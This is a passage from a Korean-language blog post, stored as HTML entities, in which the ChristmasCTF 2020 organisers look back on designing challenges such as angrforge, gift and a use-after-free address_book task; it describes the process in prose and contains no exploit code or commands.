&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;&#xB098;&#xB9CC;&#xC775;&#xC2A4;&#xC548;&#xB3FC;</p></blockquote><p>&#xC55E;&#xC5D0;&#xC11C; &#xBCF4;&#xB294;&#xB370; &#xC9C4;&#xC9DC; &#xB108;&#xBB34; &#xBB34;&#xC12D;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xADF8;&#xB0E5; &#xC81C; misc &#xBB38;&#xC81C;&#xB97C; &#xC8FC;&#xACE0; reversing&#xC744; &#xC81C;&#xAC00; &#xB0B4;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC38;&#xAC00;&#xD55C; &#xB300;&#xD68C; &#xC911; &#xD558;&#xB098;&#xC5D0;&#xC11C; angr&#xB85C; &#xD47C; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5B4;&#xC11C; angr &#xBB38;&#xC81C;&#xB97C; &#xB0B4;&#xC790;. &#xADFC;&#xB370; &#xC774;&#xAC83;&#xB3C4; arm&#xC73C;&#xB85C; &#xB0B4;&#xBA74; &#xC7AC;&#xBC0C;&#xACA0;&#xB2F9;. &#xD558;&#xACE0; &#xD6C4;&#xB531; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; arm&#xC5D0;&#xC11C;&#xB294; &#xC65C; simulation manager&#xB97C; &#xB3CC;&#xB824;&#xB3C4; &#xAC12;&#xC774; &#xC548; &#xB098;&#xC624;&#xC9C0;? &#xADF8;&#xB0E5; x64&#xB85C; &#xC644;&#xC131;&#xD558;&#xACE0; &#xB09C; &#xD6C4; L0ch&#xB97C; &#xBCF4;&#xB2C8; &#xBC40; &#xAC8C;&#xC784;&#xC744; &#xC644;&#xC131;&#xD558;&#xACE0; &#xC790;&#xAE30; type confusion &#xBABB; &#xB9CC;&#xB4E4; &#xAC83; &#xAC19;&#xC740;&#xB370; baby pwnable &#xBB50; &#xB0BC; &#xC9C0; &#xBB3C;&#xC5B4;&#xBCF4;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xADF8;&#xB0E5; &#xB358;&#xC838; &#xC92C;&#xC2B5;&#xB2C8;&#xB2E4;. arm rop &#xC7AC;&#xBC0C;&#xC744; &#xB4EF;? <code>baby_RudOlPh</code> &#xD0C4;&#xC0DD;~</p><p>&#xADFC;&#xB370; angr &#xBB38;&#xC81C;&#xB97C; &#xAC80;&#xC218;&#xD558;&#xACE0; &#xAC12;&#xC744; &#xC5F0;&#xC0B0;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC744; &#xC218;&#xC815;&#xD558;&#xACE0; &#xB098;&#xB2C8;&#xAE4C; &#xC774;&#xC0C1;&#xD558;&#xAC8C; &#xAC12;&#xC774; &#xBC00;&#xB824;&#xC11C; &#xB098;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xC5D0; c++&#xB85C; &#xC9F0;&#xC5C8;&#xACE0; &#xC804;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xACC4;&#xC18D; &#xC218;&#xC815;&#xC744; &#xD588;&#xB294;&#xB370; input&#xC774; &#xC774;&#xC0C1;&#xD558;&#xAC8C; &#xB4E4;&#xC5B4;&#xAC00;&#xAC70;&#xB098; &#xD574;&#xC11C; &#xCF54;&#xB4DC;&#xAC00; &#xC804;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xAF2C;&#xC5EC;&#xBC84;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xAD6D; c&#xB85C; &#xC62E;&#xAE30;&#xAC8C; &#xB418;&#xC5C8;&#xACE0; c&#xB85C; &#xC62E;&#xACA8;&#xC11C; &#xB098;&#xC624;&#xB294; &#xAC12;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC790; byte &#xBA87; &#xAC1C;&#xAC00; &#xC0AC;&#xB77C;&#xC9C0;&#xB354;&#xB77C;&#xACE0;&#xC694;.</p><p>&#xB300;&#xD68C;&#xB294; &#xB2F9;&#xC7A5; &#xB0B4;&#xC77C;&#xC774;&#xACE0; &#xAE09;&#xD558;&#xB2C8;&#xAE4C; &#xBC94;&#xC704;&#xAC00; &#xB118;&#xC5B4;&#xAC00;&#xC11C; &#xADF8;&#xB7F0;&#xAC00; &#xBCF4;&#xB2E4; &#xC0DD;&#xAC01;&#xD558;&#xACE0; &#xADF8;&#xB0E5; &#xD06C;&#xAC8C; &#xC5F0;&#xC0B0;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xB4E4;&#xC744; &#xC9C0;&#xC6CC;&#xBC84;&#xB9AC;&#xACE0; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAC8C; <code>angrforge</code> &#xD0C4;&#xC0DD;. &#xC0AC;&#xC2E4; &#xC774; &#xBB38;&#xC81C;&#xB294; &#xC695;&#xBA39;&#xC744; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC190;&#xC73C;&#xB85C; &#xD478;&#xC2E0; &#xBD84; &#xACC4;&#xC2DC;&#xB358;&#xB370; &#xC9C4;&#xC9DC; &#xC8C4;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;&#x2026; &#xB2E4;&#xC74C;&#xC5D0; &#xBB38;&#xC81C; &#xB9CC;&#xB4E4; &#xC77C;&#xC774; &#xC0DD;&#xAE34;&#xB2E4;&#xBA74; &#xC774;&#xB7F0; <em>*</em> &#xAC19;&#xC740; &#xC758;&#xB3C4; &#xD30C;&#xC545;&#xC870;&#xCC28; &#xC548; &#xB418;&#xB294; &#xBB38;&#xC81C;&#xB294; &#xB9CC;&#xB4E4;&#xC9C0; &#xC54A;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB300;&#xD68C;&#xB294; &#xC5EC;&#xCC28;&#xC800;&#xCC28; &#xC798; &#xB05D;&#xB0AC;&#xC9C0;&#xB9CC; &#xB9C8;&#xC74C;&#xC774; &#xBD88;&#xD3B8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB098;&#xB294; &#xB098;&#xB300;&#xB85C; &#xC5F4;&#xC2EC;&#xD788; &#xD588;&#xB294;&#xB370; &#xACB0;&#xACFC;&#xBB3C;&#xC774; &#xC88B;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xB2C8;&#xAE4C;&#xC694;. &#xC77C;&#xB2E8; &#xB0B4;&#xAC00; &#xC0DD;&#xAC01;&#xD55C; &#xB300;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>lock</code>&#xC774;&#xB098; <code>angrforge</code> &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xB294; &#xC2DC;&#xAC04;&#xC5D0; &#xCAD3;&#xACA8; &#xB85C;&#xC9C1;&#xC5D0; &#xB300;&#xD55C; &#xD070; &#xACE0;&#xBBFC; &#xC5C6;&#xC774; &#xB9CC;&#xB4E0; &#xBB38;&#xC81C;&#xB4E4;&#xC774;&#xB77C;&#xC11C; &#xB9C8;&#xC74C;&#xC5D0; &#xB4E4;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC70;&#xC758; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xBB38;&#xC81C; &#xC81C;&#xC791; &#xC2DC;&#xAC04;&#xC744; <code>gift</code>&#xC5D0; &#xC3DF;&#xC558;&#xACE0;, &#xC2E4;&#xC81C; &#xC774;&#xB7EC;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC6B4;&#xC601;&#xB3FC;&#xC11C; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; &#xC774;&#xB807;&#xAC8C; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC7AC;&#xBC0C;&#xACA0;&#xB2E4;.&#xB77C;&#xB294; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB3C4; &#xC798; &#xB9CC;&#xB4E4;&#xC5C8;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; &#xC774;&#xAC74; &#xCD9C;&#xC81C;&#xC790;&#xC758; &#xC0DD;&#xAC01;&#xC774;&#xC9C0; &#xCC38;&#xC5EC;&#xD558;&#xC2E0; &#xBD84;&#xB4E4;&#xC774; &#xADF8;&#xB807;&#xAC8C; &#xC0DD;&#xAC01; &#xC548; &#xD558;&#xC2E0;&#xB2E4;&#xBA74; &#xADF8;&#xAC8C; &#xB9DE;&#xB294; &#xAC70;&#xC8E0;.</p><p>&#xB300;&#xD68C;&#xAC00; &#xB05D;&#xB098;&#xACE0; &#xB098;&#xC11C; &#xC2EC;&#xC57C; &#xBC84;&#xC2A4;&#xB97C; &#xD0C0;&#xACE0; &#xC9D1;&#xC73C;&#xB85C; &#xCD9C;&#xBC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC70;&#xC758; 40&#xC2DC;&#xAC04; &#xB118;&#xAC8C; &#xAE68;&#xC5B4; &#xC788;&#xC5C8;&#xB358; &#xAC83; &#xAC19;&#xB124;&#xC694;. &#xBC84;&#xC2A4;&#xC5D0;&#xC11C; &#xC7A0;&#xB3C4; &#xC548; &#xC624;&#xB354;&#xAD70;&#xC694;. &#xADF8;&#xB0E5; &#xD604;&#xD0C0;&#xAC00; &#xC138;&#xAC8C; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#x2026; &#xB0B4;&#xAC00; &#xC9C4;&#xC9DC; &#xBABB;&#xD558;&#xB294;&#xAD6C;&#xB098;. &#xB0B4;&#xAC00; &#xC0DD;&#xAC01;&#xD588;&#xB358; &#xAC83;&#xC774;&#xB098; &#xB2E4;&#xB978; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xAC70;&#xB098; &#xBD84;&#xC11D;&#xD558;&#xBA74;&#xC11C; &#xBD24;&#xB358; &#xB85C;&#xC9C1;&#xB4E4;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xC9C0;&#xB3C4; &#xBABB;&#xD558;&#xACE0;, &#xC0DD;&#xAC01;&#xC758; &#xB113;&#xC774;&#xB098; &#xAE4A;&#xC774;&#xB3C4; &#xBD80;&#xC871;&#xD558;&#xAD6C;&#xB098;. &#xB0B4;&#xAC00; &#xC0DD;&#xAC01;&#xD55C; &#xAC83;&#xBCF4;&#xB2E4; &#xC0AC;&#xB78C;&#xB4E4;&#xC740; &#xB354; &#xB113;&#xC740; &#xAC83;&#xC744; &#xBCF4;&#xB294;&#xAD6C;&#xB098;.</p><p>&#xB3CC;&#xC774;&#xCF1C; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xB2C8; &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xBD24;&#xC744; &#xB54C; &#xC8FC;&#xC81C;&#xB098; &#xCEE8;&#xC149;&#xC774; &#xC7AC;&#xBC0C;&#xACE0; &#xC2E0;&#xC120;&#xD55C; &#xAC83;&#xC5D0;&#xB9CC; &#xB108;&#xBB34; &#xC2E0;&#xACBD; &#xC4F0;&#xC9C0; &#xC54A;&#xC558;&#xB098;? &#xB0B4;&#xAC00; &#xC0AC;&#xB78C;&#xB4E4;&#xC5D0;&#xAC8C; &#xADF8; &#xC7AC;&#xBBF8;&#xB97C; &#xC628;&#xC804;&#xD788; &#xC804;&#xB2EC;&#xD560; &#xB9CC;&#xD07C;&#xC758; &#xAE30;&#xBCF8; &#xBCA0;&#xC774;&#xC2A4;&#xAC00; &#xB418;&#xB294;&#xAC00;?&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC9D1;&#xC5D0; &#xB3CC;&#xC544;&#xC640;&#xC11C; &#xC0E4;&#xC6CC;&#xD558;&#xACE0; &#xB204;&#xC6E0;&#xB294;&#xB370; &#xD574;&#xAC00; &#xB730; &#xB54C;&#xAE4C;&#xC9C0; &#xC7A0;&#xC744; &#xBABB; &#xC7A4;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC7A1;&#xC0DD;&#xAC01;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC77C;&#xB2E8; &#xC9C0;&#xCCD0;&#xC11C; &#xC7A0;&#xB4E4;&#xACE0; &#xC77C;&#xC5B4;&#xB098;&#xB2C8; &#xC0C1;&#xC704;&#xAD8C; &#xD300;&#xB4E4; &#xB77C;&#xC5C5;&#xC774; &#xAE30;&#xB300;&#xAC00; &#xB418;&#xB354;&#xAD70;&#xC694;. <code>lock</code>&#xC774;&#xB791; <code>angrforge</code>&#xB294; &#xBAA8;&#xB974;&#xACA0;&#xACE0; <code>gift</code>&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD478;&#xC168;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; &#xB290;&#xB07C;&#xC168;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xC0DD;&#xAC01;&#xC774; &#xC815;&#xB9D0; &#xCEF8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB77C;&#xC5C5;&#xC744; &#xB2E4; &#xBCF4;&#xACE0; &#xB098;&#xC11C; &#xB77C;&#xC5C5;&#xC744; &#xB2E4; &#xB72F;&#xC5B4;&#xACE0;&#xCCE4;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC880; &#xB354; &#xB0B4;&#xAC00; &#xC0DD;&#xAC01;&#xD588;&#xB358; &#xAC83;&#xACFC; &#xACE0;&#xBBFC;&#xD588;&#xB358; &#xAC83;&#xC774; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xADF8;&#xB9AC;&#xACE0; 2021&#xB144;&#xC5D0;&#xB294; &#xC5B4;&#xB5A4; &#xC2DD;&#xC73C;&#xB85C; &#xACF5;&#xBD80;&#xD558;&#xBA74; &#xC88B;&#xC744;&#xC9C0; &#xC774;&#xBC88; &#xAE30;&#xD68C;&#xC5D0; &#xC81C;&#xAC00; &#xBD80;&#xC871;&#xD588;&#xB358; &#xAC83;, &#xBD80;&#xC871;&#xD568;&#xC744; &#xC54C;&#xACE0; &#xC788;&#xC5C8;&#xC9C0;&#xB9CC; &#xC560;&#xC368; &#xC678;&#xBA74;&#xD558;&#xB358; &#xAC83;&#xB4E4;&#xC5D0; &#xC9C1;&#xBA74;&#xD558;&#xAC8C; &#xB418;&#xC5B4;&#xC11C; &#xC88B;&#xC740; &#xACBD;&#xD5D8;&#xC774;&#xC5C8;&#xB358; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB4E4; &#xBBF8;&#xCC9C;&#xD55C;(?) &#xBB38;&#xC81C; &#xD478;&#xC2DC;&#xB290;&#xB77C; &#xACE0;&#xC0DD; &#xB9CE;&#xC73C;&#xC168;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC7AC;&#xBC0C;&#xAC8C; &#xC990;&#xAE30;&#xC168;&#xB2E4;&#xBA74; &#xC815;&#xB9D0; &#xC88B;&#xC558;&#xC744; &#xD150;&#xB370;&#x2026;! &#xB2E4;&#xB4E4; &#xC0C8;&#xD574; &#xBCF5; &#xB9CE;&#xC774; &#xBC1B;&#xC73C;&#xC138;&#xC694;!</p><h1 id="L0ch"><a href="#L0ch" class="headerlink" title="L0ch"></a>L0ch</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. L0ch&#xC785;&#xB2C8;&#xB2E4;! CTF &#xBB38;&#xC81C; &#xCD9C;&#xC81C; &#xACBD;&#xD5D8;&#xC774;&#xB77C;&#xACE0;&#xB294; &#xB3D9;&#xC544;&#xB9AC; &#xB0B4;&#xBD80; CTF &#xBC16;&#xC5D0; &#xC5C6;&#xB358; &#xC800;&#xC5D0;&#xAC8C; &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; CTF &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xC18C;&#xC2DD;&#xC744; &#xB4E4;&#xC5C8;&#xC744; &#xB54C;..</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image7.png" alt></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image8.png" alt></p><blockquote><p>??????? &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xB77C;&#xAD6C;&#xC694;???</p></blockquote><p>&#xC9C4;&#xC9DC; &#xB531; &#xC800; &#xD45C;&#xC815;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC70;&#xC9D3;&#xB9D0; &#xC544;&#xB2C8;&#xACE0; &#xC9C4;&#xC9DC;&#xB85C;&#xC694;.</p><p>&#xAD6D;&#xBC29;&#xC758; &#xC758;&#xBB34;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB290;&#xB77C; &#xBC31;&#xC9C0;&#xAC00; &#xB41C; &#xBA38;&#xB9AC;&#xB85C; &#xC5F4;&#xC2EC;&#xD788; &#xB530;&#xB77C;&#xAC00;&#xACE0; &#xC788;&#xB358; &#xC640;&#xC911;&#xC5D0; (&#xB300;&#xD55C;&#xBBFC;&#xAD6D; &#xAD70;&#xC778;&#xB4E4; &#xD654;&#xC774;&#xD305; &#x3160;&#x3160;) CTF &#xBB38;&#xC81C;&#xB97C; &#xADF8;&#xAC83;&#xB3C4; &#xC138; &#xBB38;&#xC81C;&#xB098; &#xB9CC;&#xB4E4;&#xB77C;&#xB2C8;&#xC694;.. &#xC544;&#xBB34;&#xD2BC; &#xB370;&#xC774;&#xD130; &#xCC4C;&#xB9B0;&#xC9C0; &#xC2E0;&#xCCAD; &#xBABB;&#xD55C; &#xD300;&#xC7A5; &#xD0D3;&#xC784; @idioth @idioth @idioth</p><p>&#xADF8;&#xB807;&#xAC8C; &#xC5F4;&#xC2EC;&#xD788; &#xCD5C;&#xADFC; CTF &#xD2B8;&#xB80C;&#xB4DC;&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xACE0; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xD2C0;&#xC744; &#xC7A1;&#xC544;&#xAC00;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xBB38;&#xC81C;&#xC600;&#xB358; address_book &#xC774; &#xB098;&#xC624;&#xAC8C; &#xB41C; &#xBC30;&#xACBD;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB54C;&#xB294; &#xD558;&#xB8E8; &#xD55C; &#xC904;&#xC744; &#xC4F0;&#xAE30; &#xC704;&#xD574; &#xB5A0;&#xB3CC;&#xC544;&#xB2E4;&#xB2C8;&#xB358; &#xC911; Chrome&#xC758; &#xACF5;&#xC720; &#xD3EC;&#xC778;&#xD130; &#xAD00;&#xB828; UAF &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xAC8C; &#xB418;&#xC5C8;&#xC8E0;. </p><p>&#xAC70;&#xAE30;&#xC5D0; &#xC601;&#xAC10;&#xC744; &#xBC1B;&#xC544; &#xACF5;&#xC720; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCEE4;&#xC2A4;&#xD140;&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xD574;&#xC11C; &#xAC70;&#xAE30;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCFC;&#xAE4C;? </p><ul><li>MS tuesday patch&#xC758; diff &#xD328;&#xCE58;&#xB97C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC801;&#xC6A9;&#xD574; binary diffing&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD574;&#xBCFC;&#xAE4C;? </li></ul><p>&#xC774;&#xB807;&#xAC8C; &#xD574;&#xC11C; &#xB098;&#xC628; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xC0AC;&#xB78C; &#xC778;&#xC0DD;&#xC774; &#xACC4;&#xD68D;&#xB300;&#xB85C;&#xB9CC; &#xB420; &#xB9AC;&#xAC00; &#xC788;&#xB098;&#xC694; &#x314E;&#x314E;</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image9.png" alt></p><p>&#xBB38;&#xC81C;&#xB294; &#xC81C;&#xAC00; &#xC708;&#xB108;&#xBE14; &#xACBD;&#xD5D8;&#xC774; &#xBD80;&#xC871;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xC6D0;&#xB370;&#xC774; &#xBA87; &#xBC88; &#xBD84;&#xC11D;&#xD574;&#xBCF8; &#xAC8C; &#xC804;&#xBD80;&#xC778; &#xC800;&#xC5D0;&#xAC8C; &#xCDE8;&#xC57D;&#xC810; &#xC124;&#xACC4;&#xBD80;&#xD130; &#xC775;&#xC2A4;&#xAE4C;&#xC9C0; &#xD55C;&#xB2E4;? &#xBA58;&#xD0C8;&#xC774; &#xC544;&#xC8FC; &#xACF1;&#xAC8C; &#xAC08;&#xB9B4; &#xAC70;&#xB77C;&#xB294; &#xAC78; &#xC2DC;&#xC791;&#xBD80;&#xD130; &#xC608;&#xAC10;&#xD588;&#xC8E0;.</p><p>&#xC6B0;&#xC120; C++&#xC758; &#xACF5;&#xC720; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xB824;&#xBA74; &#xB2F9;&#xC5F0;&#xD788; C++&#xC744; &#xC368;&#xC57C; &#xD558;&#xB294;&#xB370; &#xAE30;&#xBCF8;&#xC801;&#xC778; OOP &#xAC1C;&#xB150;&#xC774; &#xBD80;&#xC871;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xB358; &#xC911; &#xCF54;&#xB4DC; &#xB9AC;&#xBDF0;&#xB97C; &#xD574;&#xBCF4;&#xB2C8;&#xAE4C; &#xC9C4;&#xC9DC; &#xAC1C;&#xD310; &#xC624; &#xBD84; &#xC804;&#xC774;&#xC5C8;&#xB294;&#xB370; &#xB354;&#xD55C; &#xBB38;&#xC81C;&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xACE0;&#xCCD0;&#xC57C; &#xD560;&#xC9C0;&#xB97C; &#xBAB0;&#xB790;&#xC2B5;&#xB2C8;&#xB2E4;..   &#xBD84;&#xC11D;&#xD558;&#xC2DC;&#xBA74;&#xC11C; &#xC774;&#xAC70; &#xC65C; &#xC774;&#xB807;&#xAC8C; &#xC9DC; &#xB1A8;&#xC9C0; &#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xC5C8;&#xC744; &#xD150;&#xB370;, &#xB2E4; &#xBD80;&#xC871;&#xD55C; &#xC800;&#xC758; &#xAC1C;&#xBC1C;&#xC2E4;&#xB825; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.. </p><p>&#xB610; &#xD558;&#xB098; &#xBB38;&#xC81C;&#xB294;.. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image10.png" alt></p><blockquote><p>&#xC544;&#xB2C8; &#xB2E4; &#xB9CC;&#xB4E4;&#xC5B4;&#xB193;&#xACE0; &#xC775;&#xC2A4;&#xAC00; &#xC65C; &#xC548;&#xB418;&#xB294;&#xB370;!!!!!!!!!!!!!!!!!!!!!!!!!!</p></blockquote><p>&#xC6D0;&#xB798; &#xC775;&#xC2A4;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xB294; &#xACFC;&#xC815; &#xC911; &#xD558;&#xB098;&#xC600;&#xB358; <code>flag.txt</code> &#xD30C;&#xC77C; open&#xC744; &#xD568;&#xC218;&#xAC00; &#xACC4;&#xC18D; <code>&#xC751; &#xD30C;&#xC77C; &#xBABB; &#xC5F4;&#xC5C8;&#xC5B4; &#x314B;&#x314B;</code> &#xB97C; &#xBC49;&#xB294;&#xB370; &#xC774;&#xAC8C; &#xBB34;&#xC2A8; &#xACBD;&#xC6B0;&#xC9C0;? &#xC65C; &#xD30C;&#xC77C;&#xC744; &#xBABB; &#xC5EC;&#xB294; &#xAC70;&#xC9C0;?? &#xD63C;&#xC7A3;&#xB9D0;&#xD558;&#xBA74;&#xC11C; &#xC695;&#xB3C4; &#xD574;&#xBCF4;&#xACE0; &#xB2EC;&#xB798;&#xB3C4; &#xBCF4;&#xACE0; &#xC5F4;&#xC2EC;&#xD788; &#xC0BD;&#xC9C8;&#xC744; &#xD588;&#xC9C0;&#xB9CC; &#xC6D0;&#xC778;&#xC744; &#xCC3E;&#xC9C0; &#xBABB;&#xD574; &#xACB0;&#xAD6D; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; <code>flag.txt</code> &#xB97C; open&#xB9CC; &#xD558;&#xACE0; &#xC775;&#xC2A4; &#xACFC;&#xC815; &#xC911; ROP &#xCCB4;&#xC778;&#xC5D0;&#xC11C; open &#xACFC;&#xC815;&#xC744; &#xBE7C;&#xACE0; file descriptor&#xB97C; &#xC774;&#xC6A9;&#xD574; flag&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD0C0;&#xD611;&#xC744; &#xBCFC; &#xC218;&#xBC16;&#xC5D0; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xD6C4;&#xC77C;&#xB2F4;<br>idioth : &#x314B;&#x314B;&#x314B;&#x314B; &#xB108; address book &#xC775;&#xC2A4; &#xD560; &#xB54C; &#xC9C4;&#xC9DC; &#xBB34;&#xC11C;&#xC6E0;&#xB358; &#xAC70; &#xC544;&#xB0D0;<br>&#xBCF8;&#xC778; : ??? &#xC65C;&#xC694; &#xB098; &#xC65C;<br>idioth : &#xB204;&#xAD6C; &#xD558;&#xB098; &#xAC78;&#xB9AC;&#xBA74; &#xC9C4;&#xC9DC; &#xC8FD;&#xB294;&#xB2E8; &#xD45C;&#xC815;&#xC774;&#xC5C8;&#xC5B4;<br>Fabu1ous : &#x3147;&#x3148;<br>&#xBCF8;&#xC778; :</p></blockquote><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E0; &#xC774;&#xC720;&#xAC00; diff patch&#xB97C; &#xC774;&#xC6A9;&#xD55C; binary diffing&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC758;&#xB3C4;&#xD55C; &#xAC70;&#xC9C0;&#xB9CC;.. &#xACC4;&#xD68D;&#xC5D0; &#xCC28;&#xC9C8;&#xC774; &#xC0DD;&#xACA8; diff patch&#xB3C4; &#xC801;&#xC6A9;&#xC744; &#xBABB;&#xD574; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC88B;&#xC9C0; &#xC54A;&#xC740; &#xD004;&#xB9AC;&#xD2F0;&#xC758; &#xC544;&#xC26C;&#xC6B4; &#xBB38;&#xC81C;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;&#x2026; </p><p>&#xADF8;&#xB807;&#xAC8C; &#xD55C; &#xBB38;&#xC81C;&#xB97C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xACE0; &#xBCF4;&#xB2C8;,  &#xC65C; 